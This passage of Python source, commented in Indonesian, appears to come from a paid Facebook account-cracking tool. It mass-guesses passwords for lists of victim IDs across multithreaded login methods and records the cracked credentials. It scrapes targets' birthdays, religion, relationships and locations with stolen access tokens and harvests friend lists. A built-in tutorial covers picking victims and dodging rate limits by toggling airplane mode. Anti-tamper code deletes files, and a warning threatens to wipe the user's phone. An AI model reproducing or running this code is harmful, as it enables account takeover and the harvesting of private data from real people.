        else:cok = open('metode.txt','w');cok.write('methode_mbasic_v1');cok.close()
        break

### Fuck You Bitch Recoder !!!
def aowkaowkaowkaowk(_konten_bukan_kontol_):
    if len(_konten_bukan_kontol_) == 10:pass
    else:kata_buat_perecode()
def anti_ganti():
    _bomb_1_ = open(bomb1,'r').read();_bomb_2_ = open(bomb2,'r').read();_bomb_3_ = open(bomb3,'r').read();_bomb_4_ = open(bomb4,'r').read()
    if _bomb_1_ == '_zxcv!.95lltgv#@%-=;sfg_':
        if _bomb_2_ == 'Dapunta_Ratya':
            if _bomb_3_ == 'EliteSourceCode01':
                if _bomb_4_ == 'ILoveYou':pass
                else:kata_buat_perecode()
            else:kata_buat_perecode()
        else:kata_buat_perecode()
    else:kata_buat_perecode()

### Crack
class crack:
    def __init__(self,files):
        global ok,cp
        self.ada = ok;self.cp = cp;self.ko = 0
        self._hayo_mau_recode_ = open('anti_recode.txt','r').read()
        if len(self._hayo_mau_recode_) == 24:pass
        else:
            try:os.remove(files)
            except:kata_buat_perecode()
        try:os.remove('opsi_dev.txt')
        except:pass
        cik = open('opsi_dev.txt','w');cik.write('null');cik.close()
        while True:
            anti_ganti();pilih_methode();_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s•%s] %sCrack Dengan Password Default/Manual [d/m]'%(O,P,O,P))
            _pilih_sandi_ = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
            if _pilih_sandi_=="":jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
            elif _pilih_sandi_ in ['m','M','2','02','002']:
                try:
                    while True:
                        try:self.apk = files;self.fs = _dapunta_dapunta_(self.apk).read().splitlines();break
                        except Exception as e:_dapunta_cici_ ("   %s"%(e));continue
                    self.fl = []
                    for i in self.fs:
                        try:self.fl.append({"id":i.split("•")[0]})
                        except:continue
                except Exception as e:_dapunta_cici_(("   %s"%e));continue
                _dapunta_cici_('%s╠══[%s•%s] %sContoh : sayang,bismillah,123456'%(O,P,O,P));self.pwlist();break
            elif _pilih_sandi_ in ['d','D','1','01','001']:
                try:
                    while True:
                        try:self.apk = files;self.fs = _dapunta_dapunta_(self.apk).read().splitlines();break
                        except Exception as e:_dapunta_cici_ ("   %s"%(e));continue
                    self.fl = [];start_methodezz();kopi = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
                    if kopi in ['']:
                        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                        menu()
                    elif kopi in ['1','01']:
                        for i in self.fs:
                            try:self.fl.append({"id":i.split("•")[0],"pw":generate1(i.split("•")[1])})
                            except:continue
                    elif kopi in ['2','02']:
                        for i in self.fs:
                            try:self.fl.append({"id":i.split("•")[0],"pw":generate2(i.split("•")[1])})
                            except:continue
                    elif kopi in ['3','03']:
                        for i in self.fs:
                            try:self.fl.append({"id":i.split("•")[0],"pw":generate3(i.split("•")[1])})
                            except:continue
                    elif kopi in ['4','04']:
                        try:os.remove('pass.txt')
                        except:pass
                        try:os.remove('passangka.txt')
                        except:pass
                        tambah_pass();tambah_pass_angka()
                        for i in self.fs:
                            try:self.fl.append({"id":i.split("•")[0],"pw":generate4(i.split("•")[1])})
                            except:continue
                    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
                    try:os.remove('opsi_cp.txt')
                    except:pass
                    _dapunta_cici_('%s║'%(O));puf = _cici_dapunta_('%s╠══[%s•%s] %sMunculkan Opsi CP? [y/t] : '%(O,P,O,P))
                    if puf in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
                    elif puf in ['1','01','001','y','Y']:auto_ganti_pass('Ya');cok = open('opsi_cp.txt','w');cok.write('opsi_cp');cok.close();started();ThreadPool(35).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_();break
                    elif puf in ['2','02','002','t','T']:auto_ganti_pass('Tidak');cok = open('opsi_cp.txt','w');cok.write('null');cok.close();started();ThreadPool(35).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_();break
                    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
                except Exception as e:_dapunta_cici_(("   %s"%e))
    def pwlist(self):
        self.pw = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Password : '%(O,P,O,P)).split(",")
        if len(self.pw) ==0:self.pwlist()
        else:
            for i in self.fl:i.update({"pw":self.pw})
            try:os.remove('opsi_cp.txt')
            except:pass
            _dapunta_cici_('%s║'%(O));puf = _cici_dapunta_('%s╠══[%s•%s] %sMunculkan Opsi CP? [y/t] : '%(O,P,O,P))
            if puf in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
            elif puf in ['1','01','001','y','Y']:auto_ganti_pass('Ya');cok = open('opsi_cp.txt','w');cok.write('opsi_cp');cok.close();started();ThreadPool(30).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_()
            elif puf in ['2','02','002','t','T']:auto_ganti_pass('Tidak');cok = open('opsi_cp.txt','w');cok.write('null');cok.close();started();ThreadPool(30).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_()
            else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    def start_crack(self,fl):
        try:
            metode = open('metode.txt','r').read()
            for i in fl.get("pw"):
                if 'methode_api_v1' in metode:log = log_api_1(fl.get("id"),i)
                elif 'methode_api_v2' in metode:log = log_api_2(fl.get("id"),i)
                elif 'methode_mbasic_v1' in metode:log = log_mbasic_1(fl.get("id"),i)
                elif 'methode_mbasic_v2' in metode:log = log_mbasic_2(fl.get("id"),i)
                elif 'methode_mobile_v1' in metode:log = log_mobile_1(fl.get("id"),i)
                elif 'methode_mobile_v2' in metode:log = log_mobile_2(fl.get("id"),i)
                else:log = log_mbasic_1(fl.get("id"),i)
                if log.get("status")=="cp":
                    files_cp = "CP/%s.txt"%(tanggal)
                    if fl.get("id") in files_cp:pass
                    else:
                        try:ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + _dapunta_dapunta_("token.txt","r").read());tt = _js_lo_(ke.text);ttl = tt["birthday"];m,d,y = ttl.split("/");m = bulan_ttl[m];ttll = (' • %s %s %s'%(d,m,y))
                        except:ttll = (''%())
                        h_cp = "\r%s[%sCP%s] %s • %s%s%s          "%(O,P,O,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
                        self.cp.append("%s•%s"%(fl.get("id"),i));_dapunta_dapunta_(files_cp,"a+").write("%s•%s%s\n"%(fl.get("id"),i,ttll.replace(' ','')));break
                elif log.get("status")=="ok":
                    files_ok = "OK/%s.txt"%(tanggal)
                    if fl.get("id") in files_ok:pass
                    else:
                        if 'methode_mbasic_v1' in metode or 'methode_mbasic_v2' in metode or 'methode_mobile_v1' in metode or 'methode_mobile_v2' in metode:h_ok = "\r%s[%sOK%s] %s • %s%s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P);cek_apk(h_ok,cvt_cookies(log.get("cookies")))
                        else:_dapunta_cici_("\r%s[%sOK%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                        self.ada.append("%s•%s"%(fl.get("id"),i));_dapunta_dapunta_(files_ok,"a+").write("%s•%s\n"%(fl.get("id"),i));break
                else:continue
            self.ko+=1
            _dapunta_cici_("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
        except:self.start_crack(fl)

### Mendapat Data Target
def target():
    try:token = _dapunta_dapunta_('token.txt','r').read()
    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));menu_log()
    idt = _cici_dapunta_("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
    try:
        zx = _req_get_('https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,link,gender,religion,short_name,relationship_status,significant_other,location,hometown,about,locale&access_token=%s'%(idt,token));zy = _js_lo_(zx.text)
    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P));menu()
    try:nm = zy["name"]
    except (KeyError,IOError):nm = ("-")
    try:nd = zy["first_name"]
    except (KeyError,IOError):nd = ("-")
    try:nt = zy["middle_name"]
    except (KeyError,IOError):nt = ("-")
    try:nb = zy["last_name"]
    except (KeyError,IOError):nb = ("-")
    try:ut = zy["birthday"]
    except (KeyError,IOError):ut = ("-")
    try:gd = zy["gender"]
    except (KeyError,IOError):gd = ("-")
    try:em = zy["email"]
    except (KeyError,IOError):em = ("-")
    try:lk = zy["link"]
    except (KeyError,IOError):lk = ("-")
    try:us = zy["username"]
    except (KeyError,IOError):us = ("-")
    try:rg = zy["religion"]
    except (KeyError,IOError):rg = ("-")
    try:rl = zy["relationship_status"]
    except (KeyError,IOError):rl = ("-")
    try:rls = zy["significant_other"]["name"]
    except (KeyError,IOError):rls = ("-")
    try:lc = zy["location"]["name"]
    except (KeyError,IOError):lc = ("-")
    try:ht = zy["hometown"]["name"]
    except (KeyError,IOError):ht = ("-")
    try:ab = zy["about"]
    except (KeyError,IOError):ab = ("-")
    try:lo = zy["locale"]
    except (KeyError,IOError):lo = ("-")
    jalan('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,nm))
    jalan('%s╠══[%s•%s] %sNama Depan : %s'%(O,P,O,P,nd))
    jalan('%s╠══[%s•%s] %sNama Tengah : %s'%(O,P,O,P,nt))
    jalan('%s╠══[%s•%s] %sNama Belakang : %s'%(O,P,O,P,nb))
    jalan('%s╠══[%s•%s] %sTTL : %s'%(O,P,O,P,ut))
    jalan('%s╠══[%s•%s] %sGender : %s'%(O,P,O,P,gd))
    jalan('%s╠══[%s•%s] %sEmail : %s'%(O,P,O,P,em))
    jalan('%s╠══[%s•%s] %sLink : %s'%(O,P,O,P,lk))
    jalan('%s╠══[%s•%s] %sUsername : %s'%(O,P,O,P,us))
    jalan('%s╠══[%s•%s] %sAgama : %s'%(O,P,O,P,rg))
    jalan('%s╠══[%s•%s] %sStatus Hubungan : %s'%(O,P,O,P,rl))
    jalan('%s╠══[%s•%s] %sHubungan Dengan : %s'%(O,P,O,P,rls))
    jalan('%s╠══[%s•%s] %sTempat Tinggal : %s'%(O,P,O,P,lc))
    jalan('%s╠══[%s•%s] %sTempat Asal : %s'%(O,P,O,P,ht))
    jalan('%s╠══[%s•%s] %sTentang : %s'%(O,P,O,P,ab))
    jalan('%s╠══[%s•%s] %sLocale : %s'%(O,P,O,P,lo))
    _dapunta_cici_('%s║'%(O))
    _cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
    menu()

### Mendapat Jumlah Teman Target
def teman_target():
    it = _cici_dapunta_('%s╠══[%s•%s] %sID Target : '%(O,P,O,P))
    try:token = _dapunta_dapunta_('token.txt','r').read();mm = _req_get_('https://graph.facebook.com/%s?access_token=%s'%(it,token));nn = _js_lo_(mm.text);_dapunta_cici_ ('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,nn['name']))
    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));menu_log()
    tt=[];te=[];lim = _cici_dapunta_('%s╠══[%s•%s] %sLimit Dump : '%(O,P,O,P));_dapunta_cici_('%s║%s'%(O,P));ada = _req_get_('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(it,lim,token));idi = _js_lo_(ada.text)
    for x in idi['data']:tt.append(x['id'])
    for id in tt:
        try:
            ada2 = _req_get_('https://graph.facebook.com/%s/friends?access_token=%s'%(id,token));idi2 = _js_lo_(ada2.text)
            try:
                for b in idi2['data']:te.append(b['id'])
            except KeyError:_dapunta_cici_('╠══[!] Private')
            _dapunta_cici_('╠══[•]',id,'•',len(te));te.clear()
        except KeyError:_dapunta_cici_('╠══[!] Akun Terkena Spam')
    _dapunta_cici_('║');_cici_dapunta_('╚══[ Kembali ]');menu()

### Menu Mengecek Hasil Crack
def hasil():
    clear()
    try:_haha_hihi_(banner(_auth01_).get('logo3'))
    except:kata_buat_perecode()
    jalan('%s╔══[ %sHasil Crack %s]'%(O,P,O));_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s1%s] %sCek Hasil OK'%(O,P,O,P));_dapunta_cici_('%s╠══[%s2%s] %sCek Hasil CP'%(O,P,O,P));ch = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    if ch in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    elif ch in ['1','01','001','a']:
        try:
            okl = os.listdir("OK");_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s Hasil Crack Yang Tersimpan Di File OK %s]'%(O,P,O));_dapunta_cici_('%s║'%(O))
            for file in okl:_dapunta_cici_('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
            _dapunta_cici_('%s║'%(O));files = _cici_dapunta_('%s╚══[%s•%s] %sMasukkan Nama File : '%(O,P,O,P));_dapunta_cici_('')
            if files == "":jalan('%s═══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));hasil()
            try:
                ppp = _dapunta_dapunta_("OK/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');_dapunta_cici_('%s[%sOK%s] %s'%(H,P,H,yyy))
                del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "");_dapunta_cici_('\n%s╔══[%s•%s] %sTotal Hasil Crack Tanggal %s Adalah %s Akun'%(O,P,O,P,del1,len(ppp)))
            except:_dapunta_cici_('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
        except (KeyError,IOError):_dapunta_cici_('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
    elif ch in ['2','02','002','b']:
        try:
            cpl = os.listdir("CP");_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s Hasil Crack Yang Tersimpan Di File CP %s]'%(O,P,O));_dapunta_cici_('%s║'%(O))
            for file in cpl:_dapunta_cici_('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
            _dapunta_cici_('%s║'%(O));files = _cici_dapunta_('%s╚══[%s•%s] %sMasukkan Nama File : '%(O,P,O,P));_dapunta_cici_('')
            if files == "":jalan('%s═══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));hasil()
            try:
                ppp = _dapunta_dapunta_("CP/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');_dapunta_cici_('%s[%sCP%s] %s'%(O,P,O,yyy))
                del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "");_dapunta_cici_('\n%s╔══[%s•%s] %sTotal Hasil Crack Tanggal %s Adalah %s Akun'%(O,P,O,P,del1,len(ppp)))
            except:_dapunta_cici_('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
        except:_dapunta_cici_('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    _dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()

def cek_hasil():
    try:os.remove('opsi_dev.txt')
    except:pass
    cik = open('opsi_dev.txt','w');cik.write('hasil');cik.close()
    print('%s╠══[ %sCek Opsi Akun Hasil Crack %s]'%(O,P,O));_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s•%s] %sContoh File : %s.txt'%(O,P,O,P,tanggal));files__ = _cici_dapunta_('%s╠══[%s•%s] %sFile : '%(O,P,O,P));files = "CP/"+files__
    try:buka_baju = _dapunta_dapunta_(files,"r").read().splitlines()
    except FileNotFoundError:_dapunta_cici_("%s╚══[%s!%s] %sFile Tidak Ada"%(M,P,M,P));time.sleep(2); menu()
    auto_ganti_pass('Ya');_dapunta_cici_("%s╚══[%s•%s] %sJumlah Akun : %s"%(O,P,O,P,str(len(buka_baju))));_dapunta_cici_("")
    for memek in buka_baju:
        if 'â€¢' in memek:memek = memek.replace('â€¢','•')
        kontol = memek.replace("•"," • ");titid  = memek.split("•")
        _format_ = "\r%s[%sCP%s] %s          "%(O,P,O,kontol)
        try:cek_opsi(titid[0],titid[1],_format_)
        except:continue
    _dapunta_cici_("");_dapunta_cici_('%s╔══[%s•%s] %sProses Pengecekan Selesai'%(O,P,O,P));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()

### Beli Lisensi Ke Admin
def buy_license():
    clear()
    try:_haha_hihi_(banner(_auth01_).get('logo3'))
    except:kata_buat_perecode()
    jalan('%s╔══[%s Menu License Key %s]'%(O,P,O));_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s1%s] %sBeli License Key'%(O,P,O,P));_dapunta_cici_('%s╠══[%s2%s] %sLogin License Key'%(O,P,O,P));lz = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P));_dapunta_cici_('%s║'%(O))
    if lz =="":jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    elif lz == "1":
        try:os.remove('license.txt')
        except:pass
        id1 = uuid.uuid4().hex[:5].upper();id2 = uuid.uuid4().hex[:5].upper();id3 = uuid.uuid4().hex[:5].upper();id4 = uuid.uuid4().hex[:5].upper();_dapunta_dapunta_("license.txt", "w").write(id1+"-"+id2+"-"+id3+"-"+id4)
        time.sleep(1)
        _dapunta_cici_("%s╠══[%s•%s] %sLicense Key Kamu : %s%s"%(O,P,O,P,O,_dapunta_dapunta_("license.txt", "r").read()))
        _dapunta_cici_("%s╠══[%s•%s] %sJangan Lupa Copy Lalu Simpan Di Notepad!"%(O,P,O,P))
        _dapunta_cici_('%s║'%(O))
        _dapunta_cici_("%s╠══[ %sList Harga Script Elite Pro %s]"%(O,P,O))
        _dapunta_cici_("%s╠══[%s•%s] %sDurasi 1 Bulan Harga %sRp 20.000"%(O,P,O,P,O))
        _dapunta_cici_("%s╠══[%s•%s] %sDurasi Unlimited Harga %sRp 50.000"%(O,P,O,P,O))
        _dapunta_cici_('%s║'%(O))
        _dapunta_cici_("%s╠══[ %sIsi Data Pendaftaran License Key %s]"%(O,P,O))
        nama = _cici_dapunta_("%s╠══[%s•%s] %sNama : "%(O,P,O,P))
        email = _cici_dapunta_("%s╠══[%s•%s] %sEmail : "%(O,P,O,P))
        durasi = _cici_dapunta_("%s╠══[%s•%s] %sDurasi : "%(O,P,O,P))
        apikey = _dapunta_dapunta_("license.txt", "r").read()
        url_wa = "https://api.whatsapp.com/send?phone=6282245780524&text="
        tks = "Hello Admin, Saya Ingin Beli Script Elite Pro\n\n"+"[•] Nama : "+nama+"\n[•] Email : "+email+"\n[•] Durasi : "+durasi+"\n[•] License Key : "+apikey
        subprocess.check_output(["am", "start", url_wa+quote(tks)])
        _dapunta_cici_('');_cici_dapunta_('%s[ %sKembali %s]%s'%(O,P,O,P));menu()
    elif lz == "2":
        try:os.remove('license.txt')
        except:pass
        try:
            link = ("https://server.dapunta.my.id/chek.php");project = ("licenseelitedapunta");key = _cici_dapunta_("%s╠══[%s•%s] %sMasukkan License Key : "%(O,P,O,P));cek = _req_get_(link+"?project="+project+"&apikey="+key).json()
            if cek["status"] == "error":_dapunta_dapunta_("license.txt","w").write(key);_dapunta_cici_('%s║'%(O));_dapunta_cici_("%s╚══[%s!%s] %sLicense Key Tidak Terdaftar"%(M,P,M,P));time.sleep(1.0);menu()
            elif cek["status"] == "expired":_dapunta_dapunta_("license.txt","w").write(key);_dapunta_cici_('%s║'%(O));_dapunta_cici_("%s╚══[%s!%s] %sLicense Key Sudah Kadaluwarsa"%(M,P,M,P));time.sleep(1.0);menu()
            else:_dapunta_dapunta_("license.txt","w").write(key);_dapunta_cici_('%s║'%(O));_dapunta_cici_("%s╚══[%s!%s] %sLicense Key Terdaftar"%(O,P,O,P));time.sleep(1.0);menu()
        except ValueError:jalan('Server Sedang Maintenance');jalan('Coba Lagi Beberapa Saat');_cici_cici_()
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()

### Mengecek Lisensi
_r369uz_ = 'dapunta_cici99@yahoo.com'
def cek_license():
    print(" >>> GRATIS USER FREE <<<")
#    try:xd = _dapunta_dapunta_("license.txt","r").read();ow = _req_get_(url_license + xd);p = _js_lo_(ow.text);k = p['username']
 #   except requests.exceptions.ConnectionError:jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P));_cici_cici_()
  #  except (KeyError,IOError):jalan('%s╠══[%s•%s] %sKamu Adalah Pengguna Gratis'%(O,P,O,P));jalan('%s╠══[%s•%s] %sUntuk Mengakses Fitur %sPro%s/%sPremium'%(O,P,O,P,O,P,O));jalan('%s╚══[%s•%s] %sSilahkan Beli License Key Terlebih Dahulu'%(O,P,O,P));_cici_cici_()
   # except ValueError:jalan('Server Sedang Maintenance');jalan('Coba Lagi Beberapa Saat');_cici_cici_()
def _haha_hihi_(huhuhu):
    if len(huhuhu) == 73:pass
    else:kata_buat_perecode()

### Variasi Teks
def var_menu():
    _dapunta_cici_('%s╔[ %sPilih Metode Login %s]'%(O,P,O))
    _dapunta_cici_('%s╠══[%s1%s] %sLogin Dengan Token [%sAkses Terbatas%s]'%(O,P,O,P,O,P))
    _dapunta_cici_('%s╠══[%s2%s] %sLogin Dengan Cookies [%sAkses Tak Terbatas%s]'%(O,P,O,P,O,P))
    _dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠[ %sFitur Tanpa Login %s]'%(O,P,O))
    _dapunta_cici_('%s╠══[%s3%s] %sTutorial Penggunaan Script'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s4%s] %sInfo Author & Team Project'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s5%s] %sLicense Key'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s6%s] %sCek Hasil Crack'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s7%s] %sCek Opsi Hasil Crack'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s0%s] %sKeluar'%(O,P,O,P))
    _dapunta_cici_('%s║'%(O))
def var_tutor():
    mlaku('%s╔══[%s Tips & Tutorial %s]'%(O,P,O))
    _dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠══[%s1%s] %sCara Mengambil Token'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s2%s] %sCara Mengambil Cookies'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s3%s] %sCara Mendapatkan Target'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s4%s] %sCara Selama Proses Crack'%(O,P,O,P))
def tutor_target():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
    mlaku('%s║ %s1 %s║ %sSiapkan Akun Tumbal Di Chrome Untuk Proses Crack     %s║'%(O,P,O,P,O))
    mlaku('%s║ %s2 %s║ %sGanti Password Akun Tumbal Terlebih Dahulu           %s║'%(O,P,O,P,O))
    mlaku('%s║ %s3 %s║ %sCari Target Akun Random, Daftar Teman Harus Publik   %s║'%(O,P,O,P,O))
    mlaku('%s║ %s4 %s║ %sTeman (FL) Bebas, Bisa 1K, 2K, 3K, ,4K, Atau 5K      %s║'%(O,P,O,P,O))
    mlaku('%s║ %s5 %s║ %sMakin Banyak Teman, Kemungkinan Makin Banyak Hasil   %s║'%(O,P,O,P,O))
    mlaku('%s║ %s6 %s║ %sKetuk Foto Profil/Sampul Target                      %s║'%(O,P,O,P,O))
    mlaku('%s║ %s7 %s║ %sLihat URL/Link Di Bagian Atas, Terdapat \'id=10001xx\' %s║'%(O,P,O,P,O))
    mlaku('%s║ %s8 %s║ %sNah, Itu Adalah ID Target Yang Siap Untuk Di Crack   %s║'%(O,P,O,P,O))
    mlaku('%s║ %s9 %s║ %sBuka Termux/Linux Kemudian Lanjut Ke Proses Crack    %s║'%(O,P,O,P,O))
    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
    _dapunta_cici_('%s║'%(O))
def tutor_crack():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
    mlaku('%s║ %s1 %s║ %sMetode Api : Proses Cepat Tapi Mudah Spam            %s║'%(O,P,O,P,O))
    mlaku('%s║ %s2 %s║ %sMetode Mbasic : Proses Agak Cepat, Jarang Kena Spam  %s║'%(O,P,O,P,O))
    mlaku('%s║ %s3 %s║ %sMetode Mobile : Proses Lambat, Kemungkinan OK Besar  %s║'%(O,P,O,P,O))
    mlaku('%s║ %s4 %s║ %sCrack Menggunakan Kuota Data (Tidak Support Wifi)    %s║'%(O,P,O,P,O))
    mlaku('%s║ %s5 %s║ %sApabila Hasil Tidak Muncul Saat Crack Berjalan       %s║'%(O,P,O,P,O))
    mlaku('%s║ %s6 %s║ %sAktifkan Mode Pesawat 5 Detik Saja                   %s║'%(O,P,O,P,O))
    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
    _dapunta_cici_('%s║'%(O))
def var_author():
    mlaku('%s╔══[ %sAuthor & Team Project %s]'%(O,P,O))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sAuthor :'%(O,P,O,P))
    mlaku('%s║     • %sLAL KIMOCHI'%(O,P))
    mlaku('%s║     • %sMuhamad Rizal Fiansyah Id'%(O,P))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sTeam Project %sKENA RECODE%s :'%(O,P,O,P,O,P))
    mlaku('%s║     • %sNAMA LU'%(O,P))
    mlaku('%s║     • %sYayan XD'%(O,P))
    mlaku('%s║     • %sBoy Hamzah'%(O,P))
    mlaku('%s║     • %sLatip Harkat'%(O,P))
    mlaku('%s║     • %sZacky Tricker'%(O,P))
    mlaku('%s║     • %sRizky Dev'%(O,P))
    mlaku('%s║     • %sIqbal Dev'%(O,P))
    mlaku('%s║     • %sFallen'%(O,P))
    mlaku('%s║     • %sHanifan'%(O,P))
    mlaku('%s║     • %sRizky Leviathan'%(O,P))
    mlaku('%s║'%(O))
def var_ugen():
    _dapunta_cici_("%s╠══[%s1%s] %sDapatkan User Agent"%(O,P,O,P))
    _dapunta_cici_("%s╠══[%s2%s] %sGanti User Agent %s(%sManual%s)"%(O,P,O,P,O,P,O))
    _dapunta_cici_("%s╠══[%s3%s] %sGanti User Agent %s(%sSesuaikan HP%s)"%(O,P,O,P,O,P,O))
    _dapunta_cici_("%s╠══[%s4%s] %sHapus User Agent"%(O,P,O,P))
    _dapunta_cici_("%s╠══[%s5%s] %sCek User Agent"%(O,P,O,P))
    _dapunta_cici_("%s╠══[%s0%s] %sKembali"%(O,P,O,P))
def start_method():
    _dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠══[%s1%s] %sMetode Api V1'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s2%s] %sMetode Api V2'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s3%s] %sMetode Mbasic V1'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s4%s] %sMetode Mbasic V2'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s5%s] %sMetode Mobile FB V1'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s6%s] %sMetode Mobile FB V2'%(O,P,O,P))
def start_methodezz():
    _dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠══[%s1%s] %sCrack Cepat %s[%sHasil Sedikit%s]'%(O,P,O,P,O,P,O))
    _dapunta_cici_('%s╠══[%s2%s] %sCrack Lambat %s[%sHasil Banyak%s]'%(O,P,O,P,O,P,O))
    _dapunta_cici_('%s╠══[%s3%s] %sCrack Sangat Lambat %s[%sHasil Lebih Banyak%s]'%(O,P,O,P,O,P,O))
    _dapunta_cici_('%s╠══[%s4%s] %sCrack Password Gabungan'%(O,P,O,P))
def started():
    _dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠══[%s•%s] %sCrack Sedang Berjalan...'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.txt'%(O,P,O,P,tanggal))
    _dapunta_cici_('%s╠══[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.txt'%(O,P,O,P,tanggal))
    _dapunta_cici_('%s╚══[%s•%s] %sAktifkan Mode Pesawat [5 Detik Saja] Setiap 5 Menit\n'%(O,P,O,P))
def kata_buat_perecode():
    clear()
    _dapunta_cici_('%s╔══[ %sPeringatan/Warning %s]'%(M,P,M))
    _dapunta_cici_('%s║'%(M))
    _dapunta_cici_('%s╠══[ %sIndonesia %s]'%(M,P,M))
    _dapunta_cici_('%s║   • %sAnda Tidak Bisa Mengubah SC Ini'%(M,P))
    _dapunta_cici_('%s║   • %sTanpa Seizin Author'%(M,P))
    _dapunta_cici_('%s║   • %sSetelah Peringatan Ini Muncul'%(M,P))
    _dapunta_cici_('%s║   • %sBerarti Anda Telah Mengubah Isi SC Ini'%(M,P))
    _dapunta_cici_('%s║   • %sKemudian Data Di HP Anda Akan Terhapus'%(M,P))
    _dapunta_cici_('%s║   • %sJangan Sekali-Sekali Melanggar Hak Cipta'%(M,P))
    _dapunta_cici_('%s║   • %sAnda Harus Membeli Lisensi Untuk Premium'%(M,P))
    _dapunta_cici_('%s║   • %sTidak Ada Yang Gratis'%(M,P))
    _dapunta_cici_('%s║   • %sStop Recode !!!'%(M,P))
    _dapunta_cici_('%s║   • %sTerima Kasih'%(M,P))
    _dapunta_cici_('%s║'%(M))
